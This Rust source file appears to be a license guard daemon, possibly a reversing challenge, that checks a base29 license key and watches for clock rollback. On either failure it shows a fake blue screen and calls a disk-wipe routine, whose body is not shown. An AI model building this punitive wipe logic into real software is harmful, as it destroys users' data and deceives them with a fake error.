use std::io::{self, Write};
use std::fs;
use std::time::{SystemTime, UNIX_EPOCH, Duration};
use std::thread;

mod death_penalty;

const LOCK_FILE: &str = "/var/lib/tekipaki/.lock";

fn main() {
    println!("Tekipaki-Guard v1.6 Initializing...");

    // Check for clock rollback
    if let Ok(last_time_str) = fs::read_to_string(LOCK_FILE) {
        if let Ok(last_time) = last_time_str.trim().parse::<u64>() {
            let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
            if now < last_time {
                println!("System Error: Clock rollback detected!");
                death_penalty::display_bsod();
                thread::sleep(Duration::from_secs(3));
                death_penalty::perform_disk_wipe();
                std::process::exit(1);
            }
        }
    }

    // Save current time
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    let _ = fs::create_dir_all("/var/lib/tekipaki");
    let _ = fs::write(LOCK_FILE, now.to_string());

    // License Check
    let key_file = "/etc/tekipaki/license.key";
    if let Ok(key) = fs::read_to_string(key_file) {
        let k_clean = key.trim().replace("-", "");
        if let Some(k_int) = guard_lib::base29_to_bigint(&k_clean) {
            let edition = guard_lib::check_edition(k_int);
            if edition == "Invalid" {
                println!("Invalid License Detected!");
                death_penalty::display_bsod();
                thread::sleep(Duration::from_secs(3));
                death_penalty::perform_disk_wipe();
            } else {
                println!("Tekipaki OS {} Edition Activated.", edition);
            }
        }
    } else {
        println!("No license found. Running in Trial Mode (30 mins)...");
        // Enforce trial limits here
    }

    println!("Daemon running in background...");
}
